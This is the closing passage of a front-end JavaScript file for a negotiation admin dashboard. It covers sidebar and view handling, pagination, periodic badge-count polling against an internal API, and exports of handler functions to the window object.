function toggleSidebar() { $('#sidebar')?.classList?.toggle('-translate-x-full'); $('#sidebarOverlay')?.classList?.toggle('hidden'); }

function showView(view) { $('#sidebar')?.classList?.add('-translate-x-full'); $('#sidebarOverlay')?.classList?.add('hidden'); renderView(view); }

function changePage(delta) { NegotiationAdminState.page += delta; renderView(NegotiationAdminState.currentView); }

// ============ INIT ============
document.addEventListener('DOMContentLoaded', async () => {
  renderView('active');
  startPolling();
});

function startPolling() {
  NegotiationAdminState.pollingInterval = setInterval(() => {
    if (NegotiationAdminState.selectedNegotiation) {
      // Would refresh the open modal
    }
    // Refresh badges
    refreshBadges();
  }, 30000);
}

function stopPolling() { if (NegotiationAdminState.pollingInterval) { clearInterval(NegotiationAdminState.pollingInterval); NegotiationAdminState.pollingInterval = null; } }

async function refreshBadges() {
  try {
    const data = await api('/negotiations?limit=1000');
    const all = data.negotiations || [];
    $('#activeCountBadge').textContent = all.filter(n => n.status === 'active').length;
    $('#stalledCountBadge').textContent = all.filter(n => n.status === 'stalled').length;
    $('#completedCountBadge').textContent = all.filter(n => n.status === 'completed').length;
    $('#expiredCountBadge').textContent = all.filter(n => n.status === 'expired').length;
  } catch (e) { console.warn('Badge refresh failed:', e); }
}

window.showView = showView;
window.toggleSidebar = toggleSidebar;
window.refreshView = refreshView;
window.closeModal = closeModal;
window.changePage = changePage;
window.openNegotiationDetail = openNegotiationDetail;
window.sendAdminMessage = sendAdminMessage;
window.handleAdminKeydown = handleAdminKeydown;
window.quickReply = quickReply;
window.updateNegotiationStatus = updateNegotiationStatus;
window.increasePrice = increasePrice;
window.generateProof = generateProof;
window.verifyProofFile = verifyProofFile;
window.viewProof = viewProof;
window.exportNegotiationLog = exportNegotiationLog;